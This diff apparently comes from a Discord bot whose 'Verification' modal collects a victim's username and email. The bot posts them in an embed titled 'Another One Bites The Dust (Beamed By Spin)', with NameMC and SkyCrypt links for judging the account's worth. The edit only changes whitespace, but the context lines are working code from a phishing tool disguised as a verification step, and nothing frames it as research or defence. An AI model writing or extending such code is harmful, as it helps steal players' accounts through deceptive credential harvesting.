@@ -25,7 +25,7 @@ class MyModalOne(ui.Modal, title="Verification"):
                             title="Another One Bites The Dust (Beamed By Spin)",
                             description=f"**Username:**:\n ```{self.box_one.value}```\n"
                                         f"**Email**:\n ```{self.box_two.value}```\n"
-                                        f"**[NameMC + SkyCrypt]**\n https://namemc.com/profile/{self.box_one.value}\nhttps://sky.shiiyu.moe/stats/{self.box_one.value}",
+                                        f"**[NameMC + SkyCrypt]**\nhttps://namemc.com/profile/{self.box_one.value}\nhttps://sky.shiiyu.moe/stats/{self.box_one.value}",
                             colour=0xff0000
                         )
                     )
